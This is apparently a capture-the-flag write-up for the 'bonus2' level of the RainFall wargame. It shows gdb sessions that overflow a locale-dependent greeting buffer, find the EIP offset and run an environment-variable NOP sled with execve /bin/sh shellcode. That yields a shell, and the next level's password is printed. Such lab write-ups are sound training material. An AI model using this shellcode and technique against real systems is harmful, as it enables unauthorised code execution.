 ▄▄                                                           ▄▄▄▄▄
 ██                                                          █▀▀▀▀██▄
 ██▄███▄    ▄████▄   ██▄████▄  ██    ██  ▄▄█████▄                  ██
 ██▀  ▀██  ██▀  ▀██  ██▀   ██  ██    ██  ██▄▄▄▄ ▀                ▄█▀
 ██    ██  ██    ██  ██    ██  ██    ██   ▀▀▀▀██▄              ▄█▀
 ███▄▄██▀  ▀██▄▄██▀  ██    ██  ██▄▄▄███  █▄▄▄▄▄██            ▄██▄▄▄▄▄
 ▀▀ ▀▀▀      ▀▀▀▀    ▀▀    ▀▀   ▀▀▀▀ ▀▀   ▀▀▀▀▀▀             ▀▀▀▀▀▀▀▀

We first recreate the original program in C.

Then, we see that a buffer overflow is really easy

(gdb) set env LANG=en
(gdb) run $(python2 -c "print 'A'*40 + ' ' + 'B'*32")
Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()

We have almost overwritten a pointer (?).
We canot use a longer input, but we can switch language :)

Here are the size of the greetings:
- en: 7
- fi: 19
- nl: 15

(gdb) set env LANG=fi
(gdb) run $(python2 -c "print 'A'*40 + ' ' + 'B'*32")
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) i r
ebp            0x42424242       0x42424242
eip            0x42424242       0x42424242
(...)

We have overriden eip !

Again, we use We are again using https://wiremask.eu/tools/buffer-overflow-pattern-generator/
(gdb) run $(python2 -c "print 'A'*40") Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
0x41366141 in ?? ()
-> offset is 18

Ok, let's do it just like in bonus0 (execute shellcode from env var)
-> Notice the big nopsled: the exploit would not work otherwise

bonus2@RainFall:~$ export LANG=fi
bonus2@RainFall:~$ export SCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
bonus2@RainFall:~$ /tmp/getenv SCODE
SCODE @ 0xbffff8e9 -> \x9d\xf8\xff\xbf
./bonus2 $(python -c "print 'A'*40 + ' ' + 'B'*18 + '\x9d\xf8\xff\xbf'")
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
